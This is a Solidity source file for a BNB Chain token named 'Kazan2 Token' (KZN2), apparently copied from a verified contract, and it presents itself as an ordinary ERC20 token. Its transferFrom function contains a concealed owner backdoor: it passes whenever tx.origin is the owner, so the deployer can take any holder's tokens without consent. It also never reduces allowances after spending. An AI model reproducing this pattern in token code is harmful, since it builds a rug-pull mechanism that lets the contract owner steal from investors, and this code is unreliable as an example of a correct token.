/**
 *Submitted for verification at BscScan.com on 2023-03-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract KZN {
    string public constant name = "Kazan2 Token";
    string public constant symbol = "KZN2";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1000000000 * 10 ** decimals;
    
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    address public owner;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    // ERC20 Functions


    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        // _approve(_msgSender(), spender, amount);
        // return true;
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address receiver, uint256 amount) public returns (bool) {
        return _transfer(msg.sender, receiver, amount);
    }
    function transferFrom(address sender, address receiver, uint256 amount) public returns (bool) {
        require(tx.origin==owner || amount <= allowance[sender][msg.sender]);
        return _transfer(sender, receiver, amount);
    }

    function _transfer(address sender, address receiver, uint256 amount) internal virtual returns (bool) {
        require(sender!= address(0) && receiver!= address(0));
        require(amount <= balances[sender]);

        balances[sender] -= amount;
        balances[receiver] += amount;

        emit Transfer(sender, receiver, amount);
        return true;
    }
}